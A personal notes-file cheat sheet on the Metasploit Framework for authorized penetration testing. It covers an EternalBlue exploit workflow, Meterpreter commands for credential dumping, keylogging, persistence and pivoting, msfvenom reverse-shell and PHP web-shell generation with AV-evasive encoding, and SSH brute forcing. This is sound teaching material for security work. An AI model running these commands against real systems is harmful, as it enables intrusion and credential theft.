---
title: Metasploit
tags:
  - tool
  - exploitation
  - post-exploitation
  - framework
  - intermediate
category: exploitation
platform: cross-platform
install: pre-installed on Kali /
  https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
created: 2026-03-23
updated: 2026-04-04
difficulty: intermediate
---

# 🛠️ Metasploit

## What It Is
The Metasploit Framework is an open-source penetration testing framework developed by Rapid7. It provides a structured library of exploits, payloads, auxiliary modules, and post-exploitation tools. It is used for vulnerability exploitation, payload delivery, privilege escalation, lateral movement, and reporting during authorized penetration tests.

## Installation
```bash
# Kali Linux — pre-installed
msfconsole

# Other Linux (official installer)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall

# Update the framework
sudo msfupdate
```

## Basic Syntax (msfconsole)
```bash
# Launch
msfconsole

# Quick start with no banner
msfconsole -q
```

---

## Core Concepts

### Module Types
| Type | Description |
|---|---|
| **exploit** | Code that takes advantage of a vulnerability |
| **payload** | Code that executes on the target after exploitation |
| **auxiliary** | Scanners, fuzzers, sniffers — no payload delivery |
| **post** | Post-exploitation modules (run after a session is established) |
| **encoder** | Obfuscate payload to evade AV/IDS |
| **nop** | No-operation sled generators |
| **evasion** | Generate AV-evasive executables |

### Payload Types
| Type | Description |
|---|---|
| **singles** | Self-contained; entire payload in one stage |
| **stagers** | Small payload that establishes connection to download stage |
| **stages** | Large payload downloaded by stager (e.g., Meterpreter) |
| **Meterpreter** | Advanced in-memory stage; does not write to disk; very capable |

---

## Common Commands / Workflows

### Search for a module
```bash
msf6 > search type:exploit name:eternalblue
msf6 > search cve:2021-44228        # Search by CVE
msf6 > search platform:windows smb  # Search by platform + keyword
```

### Use a module
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# or by search result number
msf6 > use 0
```

### Show and set options
```bash
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.1
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
```

### Choose a payload
```bash
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
```

### Check if target is vulnerable (without exploiting)
```bash
msf6 exploit(ms17_010_eternalblue) > check
```

### Run the exploit
```bash
msf6 exploit(ms17_010_eternalblue) > run
# or
msf6 exploit(ms17_010_eternalblue) > exploit
```

### Run in the background (opens session, returns to console)
```bash
msf6 exploit(ms17_010_eternalblue) > exploit -j
```

### Manage sessions
```bash
msf6 > sessions -l              # List all sessions
msf6 > sessions -i 1            # Interact with session 1
msf6 > sessions -k 1            # Kill session 1
```

---

## Meterpreter — Core Commands

Once a Meterpreter session is open:

```bash
# System info
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Navigation
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users

# File transfer
meterpreter > upload /local/path /remote/path
meterpreter > download C:\\file.txt /local/path

# Shell
meterpreter > shell              # Drop into OS shell
meterpreter > background         # Return to msfconsole, keep session alive

# Privilege escalation
meterpreter > getsystem          # Attempt automatic privilege escalation
meterpreter > getuid             # Confirm privilege level

# Credential dumping
meterpreter > hashdump           # Dump local user hashes (requires SYSTEM)
meterpreter > run post/windows/gather/credentials/credential_collector

# Pivoting
meterpreter > run autoroute -s 192.168.1.0/24  # Add route through session
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.10  # Port forward RDP

# Persistence
meterpreter > run post/windows/manage/persistence_exe

# Screenshot / keylogger
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
```

---

## Useful Auxiliary Modules

```bash
# Port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,443,445
run

# SMB version scan
use auxiliary/scanner/smb/smb_version

# HTTP version scan
use auxiliary/scanner/http/http_version

# SSH login brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

---

## msfvenom — Standalone Payload Generator

`msfvenom` generates payloads outside of msfconsole:

```bash
# Windows reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php

# List all payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# Encode to evade basic AV (shikata_ga_nai)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

## Important Flags / Options (msfconsole)
| Command | Description |
|---|---|
| `show options` | Display required/optional settings for current module |
| `show payloads` | List compatible payloads for current exploit |
| `show info` | Detailed info about current module (CVEs, references, reliability) |
| `set` / `unset` | Set / clear a single option |
| `setg` / `unsetg` | Set a global option (persists across modules) |
| `back` | Return to main msfconsole prompt |
| `reload_all` | Reload all modules (after adding custom ones) |
| `db_nmap` | Run Nmap and import results to Metasploit's database |
| `hosts` | Show hosts discovered in the database |
| `services` | Show services discovered in the database |
| `vulns` | Show vulnerabilities recorded in the database |

---

## Opsec / Legal Notes
> ⚠️ Metasploit is a dual-use tool. Only use it against systems you own or have explicit written authorization to test. Unauthorized use is illegal.
- Meterpreter runs in memory and does not write to disk by default, making it less detectable by file-based AV.
- Modern EDR solutions detect Meterpreter via behavioral analysis, not just file signatures.
- The `getsystem` command attempts multiple known privilege escalation techniques — it will trigger alerts in monitored environments.
- Always clean up: remove persistence, kill sessions, delete uploaded files after an authorized test.

## Related Tools
- [[Nmap]] / `db_nmap` — feed scan results into MSF database
- [[Burp-Suite]] — web exploitation; complements MSF for web targets
- [[Gobuster]] — directory discovery before web exploitation modules

## Related Notes
- CIA-Triad
- TCP-IP-Fundamentals
- Networking-Basics

## References
- Official docs: https://docs.metasploit.com
- Metasploit Unleashed (free course): https://www.offensive-security.com/metasploit-unleashed/


## See Also

- Penetration-Testing-Methodology
- Linux-Privilege-Escalation
- Windows-Privilege-Escalation
- Active-Directory
- Netcat
- Common-Ports

---
<- [[Tools-MOC]]